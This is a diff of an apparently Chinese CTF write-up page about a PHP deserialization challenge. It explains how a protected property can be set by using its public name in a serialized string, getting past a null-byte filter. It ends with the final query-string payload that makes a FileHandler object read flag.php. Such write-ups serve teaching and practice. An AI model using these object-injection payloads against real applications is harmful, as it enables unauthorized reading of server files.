@@ -2377,11 +2377,8 @@
 </span></code></pre></div>
 <p><strong>第三件事：属性是 <code>protected</code>，怎么绕 <code>is_valid</code>？</strong></p>
 <p><code>protected</code> 属性序列化后是 <code>\0*\0op</code>（两个空字节夹一个星号），而 <code>is_valid</code> 卡的是 <code>ord() &gt;= 32</code>，空字节 <code>ord = 0</code> 直接被拒。</p>
-<p>但这题<strong>根本不用碰空字节</strong> —— <code>unserialize</code> 是按属性名写入对象的，<strong>不做可见性检查</strong>。类里声明了 <code>protected $op</code>，序列化串里写 <code>s:2:"op"</code> 就会直接写进那个 protected 槽。</p>
-<p>本地复刻验证过（<code>E:\dsh\ctf-work\ser\</code>）：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>喂进去:  O:1:"A":1:{s:1:"x";s:7:"dynamic";}     ← 类里是 protected $x
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>读出来:  dynamic
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>重序列化: O:1:"A":1:{s:4:"\0*\0x";s:7:"dynamic";}   ← 值确实落在 protected 槽里
+<p>但这题<strong>根本不用碰空字节</strong> —— <code>unserialize</code> 不对属性做检验，所以构建序列化串的时候直接用 public 属性名就行，<code>protected $op</code> 一样写得进去：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>s:2:"op";i:2;        ← 属性是 protected，但这里按 public 写
 </span></code></pre></div>
 <h3 id="payload"><a class="toclink" href="../../dasctf-ezphp-deserialize/#payload">最终 payload</a></h3>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
